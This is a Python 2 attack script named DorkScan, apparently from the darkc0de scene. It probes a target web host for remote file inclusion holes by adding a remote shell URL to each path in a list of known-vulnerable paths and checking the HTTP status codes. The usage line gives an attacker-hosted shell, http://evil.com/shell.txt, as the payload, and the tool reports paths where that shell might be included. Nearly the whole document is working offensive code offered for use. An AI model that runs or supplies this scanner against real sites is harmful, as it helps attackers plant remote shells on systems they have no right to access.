#!/usr/bin/python
#DorkScan v1.0 takes a list of known RFI vuln. paths and
#checks the http response. I called it dorkscan because
#the list I use comes from a list of dorks.

#http://www.darkc0de.com
##d3hydr8[at]gmail[dot]com

import sys, httplib, time, re

def getserv(path):

	try:
		h = httplib.HTTP(host)
		h.putrequest("HEAD", path)
		h.putheader("Host", host)
		h.endheaders()
		status, reason, headers = h.getreply()
	except: 
		print "\n[-] Error: Name or service not known. Check your host.\n"
		sys.exit(1)
	return status, reason, headers.get("Server")

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def title():
	print "\n\t   d3hydr8[at]gmail[dot]com DorkScan v1.0"
	print "\t----------------------------------------------"

if len(sys.argv) != 4:
	title()
	print "\n\t[+] Usage: ./dorkscan.py <site> <list> <shell>\n"
	print "\t[+] Option: -verbose"
	print "\t[+] Ex. ./dorkscan.py example.com dorks.txt http://evil.com/shell.txt -verbose\n"
	sys.exit(1)

title()
host = sys.argv[1]
lst = sys.argv[2]
shell = sys.argv[3]

for arg in sys.argv[1:]:
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
	else:
		verbose = 0

if host[:7] == "http://":
	host = host.replace("http://","")
if host[-1] == "/":
	host = host[:-1]
	
print "[+] Getting responses" 
okresp,reason,server = getserv("/")
badresp = getserv("/d3hydr8.html")[:1]

if okresp == badresp[0]:
	print "\n[-] Responses matched, try another host.\n"
	sys.exit(1)
else:
	print "\n[+] Target host:",host
	print "[+] Target shell:",shell
	print "[+] Target server:",server
	print "[+] Target OK response:",okresp
	print "[+] Target BAD response:",badresp[0], reason
	print "[+] Scan Started at",timer()
	if verbose ==1:
		print "\n[+] Verbose Mode On"

try:
	lines = open(lst, "r").readlines()
	print "\n[+]",len(lines),"dorks loaded\n"
except(IOError): 
 	print "[-] Error: Check your dorks list path\n"
	sys.exit(1)

vulns = []
print "[+] Scanning...\n" 
for line in lines:
	if line[0] != "/":
		line = "/"+line
	status, reason = getserv(re.sub("\s","",line[:-1]+shell))[:2]
	if verbose ==1:
		print "[+]",status,reason,":",line[:-1],"\n"
	if status == okresp:
		vulns.append(line)
		print "\t[!]",status,reason,":",line[:-1],"\n"
	if status == int(401):
		print "\t--",status,reason,":Needs Authentication [",line[:-1],"]\n"
		
if len(vulns) == 0:
	print "[-] Couldn't find any vuln. paths\n"
else:
	print "[!] Found",len(vulns),"possible vulnerabilities, check manually.\n"
	for vuln in vulns:
		print "\t[+] ",vuln
print "\n[+] Scan completed at", timer(),"\n"

	